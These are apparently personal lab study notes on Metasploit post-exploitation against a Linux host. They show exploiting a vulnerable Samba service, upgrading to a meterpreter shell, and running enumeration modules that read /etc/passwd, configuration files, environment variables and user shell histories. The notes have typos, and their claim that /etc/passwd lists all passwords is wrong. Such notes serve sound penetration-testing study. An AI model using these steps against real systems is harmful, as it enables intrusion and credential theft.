* MSF provides various post-explitation modules to enumerate:
  * System configuration
  * Environment variables
  * Netwwork configuration
  * VM check
  * User history
 
* PRACTICAL
* Repeat steps till db_nmap
* As there is a vulnerable version of SMB running on this Linux system:
* `use linux/samba/is_known_pipename` --> Command shell session
* Put this one to background
* Raise the command shell to a meterpreter session:
  * `sessions -u [ID of the command shell]`
 
* Start a shell on  this Linux system:
  * `shell`
  * `/bin/bash -i`
  * `cat /etc/passwd` --> List all the passwords
  * `groups [name of the user]` --> Will tell the user group
  * `cat /etc/*issue` --> Release version of the ditribution
  * `uname -r` --> Kernel version
  * `uname -a` --> Additional info.
  * `ip a s` --> Info about network
  * `ps aux` --> All the processes on the system
  * `env` --> Environment variables for the current user
  * ***
  * **Post-exploitation modules**
  1. Enumerate Configuration files
    * `search enum_configs`
    * `use linux/gather/enum_configs`
        * Description:
        * This module collects configuration files found on commonly installed applications and services, such as Apache, MySQL, Samba, Sendmail, etc.
        * If a config file is found in its default path, the module will assume that is the file we want.
     
    * If one is using a workspace, the results can be displayed:
      * `loot`
      * It is used to display the information gathered by a post exploitation module from the Metasploit Framework database
      * `cat [path of the file in the list above]`
     
  2. Module for Environment variables
     * `search env platform:linux`
     * `use post/multi/gather/env`
     * `set session [ID]`
     * `run`
    
  3. Network module
     * `use post/linux/gather/enum_network`
    
  4. Protection systems/ Security Modules
     * `search enum_protections`
     * `use post/linux/gather/enum_protection`
     * Whether any system hardening mechanisms are in place.
     * `set session [ID]`
     * `run`
     * `notes` --> Results of the commands ran in the current context
    
  5. System modules
     * `use post/linux/gather/enum_system`
     * `set session [ID]`
     * `run`
    
  6. Whether a system is a docker container ora VM
     * `search checkcontainer`
     * `use post/linux/gather/checkcontainer`
     * `set session [ID]`
     * `run`
     * There are many modules that can be used to further attack the system, if it is a docker container.
     * `use linux/gather/checkvm`
     * `set session [Id]`
     * `run`
    
  7. USer History for all the user accounts
     * `use post/linux/gather/enum_users/history`
     * Sometimes users can also write down passwords or oother sensitive info which can be accessed through this module
